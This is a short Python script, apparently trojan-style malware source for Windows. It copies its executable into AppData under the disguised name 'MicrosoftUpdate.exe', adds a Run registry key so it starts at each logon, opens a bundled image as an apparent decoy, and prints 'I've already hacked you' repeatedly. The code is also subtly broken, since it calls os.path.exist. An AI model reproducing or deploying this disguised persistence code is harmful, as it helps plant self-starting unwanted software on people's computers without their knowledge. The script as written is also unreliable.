import sys
import subprocess
import os
import shutil
import time


def add_registery():
	file = os.environ["appdata"] + "\\MicrosoftUpdate.exe"
	if not os.path.exist(file):
		shutil.copyfile(sys.executable,file)
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + file
		subprocess.call(regedit_command, shell=True)

add_registery()

def file_edit():
	added_file = sys._MEIPASS + "\\45.jpg"
	subprocess.Popen(added_file, shell=True)

file_edit()

x = 0
while x<1000:
	print("I've already hacked you")
	x += 1
	time.sleep(0.5)
	